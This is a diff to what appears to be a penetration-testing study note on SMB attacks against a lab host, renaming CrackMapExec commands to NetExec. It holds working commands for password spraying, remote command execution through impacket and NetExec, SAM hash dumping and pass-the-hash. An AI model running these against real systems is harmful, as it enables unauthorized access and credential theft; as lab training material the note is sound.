@@ -28,17 +28,17 @@ smbmap -H 10.129.14.128
 enum4linux-ng -A 10.129.14.128
 
 # Brute-force a user list
-crackmapexec smb 10.129.14.128 --local-auth -u brute_users.txt -p passwords.txt --continue-on-success
+nxc smb 10.129.14.128 --local-auth -u brute_users.txt -p passwords.txt --continue-on-success
 ```
 
-## Password spraying with CrackMapExec
+## Password spraying with NetExec
 
 ```bash
 # Domain-joined hosts
-crackmapexec smb 10.129.14.128 -u users.txt -p passwords.txt --continue-on-success
+nxc smb 10.129.14.128 -u users.txt -p passwords.txt --continue-on-success
 
 # Local accounts
-crackmapexec smb 10.129.14.128 --local-auth -u users.txt -p passwords.txt
+nxc smb 10.129.14.128 --local-auth -u users.txt -p passwords.txt
 
 # Look for (Pwn3d!) in output — indicates local admin
 ```
@@ -59,8 +59,8 @@ impacket-smbexec administrator:'HTBRocks!'@10.129.14.128
 # ATExec — runs a single command via Task Scheduler (no interactive shell)
 impacket-atexec administrator:'HTBRocks!'@10.129.14.128 'whoami'
 
-# CrackMapExec command execution
-crackmapexec smb 10.129.14.128 -u administrator -p 'HTBRocks!' -x 'whoami'
+# NetExec command execution
+nxc smb 10.129.14.128 -u administrator -p 'HTBRocks!' -x 'whoami'
 ```
 
 | Tool | Method | Interactivity | Noise |
@@ -68,14 +68,14 @@ crackmapexec smb 10.129.14.128 -u administrator -p 'HTBRocks!' -x 'whoami'
 | psexec | service binary | interactive | high |
 | smbexec | cmd service | interactive | medium |
 | atexec | task scheduler | single command | low |
-| CME `-x` | cmd service | single command | medium |
+| nxc `-x` | cmd service | single command | medium |
 
 ## SAM database dump
 
 If you have admin credentials, dump the local SAM:
 
 ```bash
-crackmapexec smb 10.129.14.128 --local-auth -u administrator -p 'HTBRocks!' --sam
+nxc smb 10.129.14.128 --local-auth -u administrator -p 'HTBRocks!' --sam
 ```
 
 Output includes NTLM hashes for all local accounts. Use these for Pass-the-Hash.
@@ -85,8 +85,8 @@ Output includes NTLM hashes for all local accounts. Use these for Pass-the-Hash.
 With an NT hash from SAM dump or secretsdump:
 
 ```bash
-# CrackMapExec PTH
-crackmapexec smb 10.129.14.128 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+# NetExec PTH
+nxc smb 10.129.14.128 -u administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 # impacket-psexec PTH (hash format: LM:NT)
 impacket-psexec administrator@10.129.14.128 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
@@ -158,7 +158,7 @@ nmap -p445 --script smb-protocols 10.129.14.128
 ## Related pages
 
 - [[enumeration/smb]]
-- [[tools/crackmapexec]]
+- [[tools/netexec]]
 - [[tools/impacket]]
 - [[tools/smbclient]]
 - [[tools/enum4linux]]
